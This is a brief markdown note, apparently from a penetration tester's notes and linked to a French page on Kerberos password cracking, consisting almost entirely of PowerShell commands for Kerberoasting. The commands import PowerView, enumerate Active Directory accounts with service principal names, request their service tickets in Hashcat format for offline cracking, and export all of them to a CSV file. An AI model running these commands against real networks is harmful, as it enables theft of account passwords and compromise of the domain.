---
public: true # set to true to make the article publishable
---
```powershell
# Extract TGS Tickets
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
# Using PowerView to Target a Specific User
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation

```

[[Cassage de mots de passes Kerberos]]